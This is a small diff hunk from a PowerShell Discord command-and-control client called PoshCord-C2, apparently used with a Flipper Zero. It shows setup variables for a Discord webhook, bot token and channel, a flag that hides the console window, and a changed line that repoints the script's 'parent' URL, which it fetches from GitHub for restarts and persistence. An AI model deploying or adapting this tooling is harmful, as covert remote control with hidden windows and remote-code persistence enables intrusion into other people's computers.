@@ -35,7 +35,7 @@ $hookurl = "$dc" # eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r
 $token = "$tk" # make sure your bot is in the same server as the webhook
 $chan = "$ch" # make sure the bot AND webhook can access this channel
 
-$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://raw.githubusercontent.com/pickle493/Flipper-Zero/main/PoshCord-C2.ps1" # parent script URL (for restarts and persistance)
 $HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 
 # =============================================================== SCRIPT SETUP =========================================================================
